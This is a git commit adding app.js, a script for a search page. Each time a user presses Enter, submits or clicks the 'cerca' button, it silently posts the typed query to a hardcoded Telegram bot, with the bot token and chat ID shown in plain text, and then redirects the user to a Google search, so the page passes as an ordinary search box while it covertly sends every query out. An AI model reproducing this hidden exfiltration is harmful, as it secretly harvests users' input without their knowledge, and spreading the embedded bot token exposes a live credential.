569ac07c300bd9406b5d14c4011bd5de349c3f1d
DomenicoMereu97 <75221419+DomenicoMereu97@users.noreply.github.com>
2021-03-14 19:01:04 +0100

    Add files via upload

---
+++ app.js
@@ -0,0 +1,86 @@
+
+
+
+
+function inputFunction() {
+  var x = document.getElementById("search-box").value;
+  return x
+  
+}
+
+
+
+
+
+
+
+document.getElementById("search-box").addEventListener("keydown", function(event) {
+    
+    if (event!= null && event.code == 'Enter') {
+        event.preventDefault();
+        input = inputFunction();
+        $.ajax({
+            url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
+            method: 'POST',
+            data: { chat_id: '699973760', text: input },
+            
+        });
+        location.replace('http://google.com/search?q='+ input)
+    }
+});
+
+document.getElementById("search-box").addEventListener("submit", function(event) {
+    
+    if (event!= null && event.code == 'Enter') {
+        event.preventDefault();
+        input = inputFunction();
+        $.ajax({
+            url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
+            method: 'POST',
+            data: { chat_id: '699973760', text: input },
+            
+        });
+        location.replace('http://google.com/search?q='+ input)
+    }
+});
+
+
+
+
+
+
+
+
+
+inputUserFunction=document.getElementById("cerca").addEventListener('click', function(){
+    input = inputFunction();
+    $.ajax({
+        url: 'https://api.telegram.org/bot' + '940327160:AAHCBZOigkEsdsaG57p8658eLsK_VK3go1g' + '/sendMessage',
+        method: 'POST',
+        data: { chat_id: '699973760', text: input },
+        
+    });
+    location.replace('http://google.com/search?q='+ input);
+    
+
+})
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
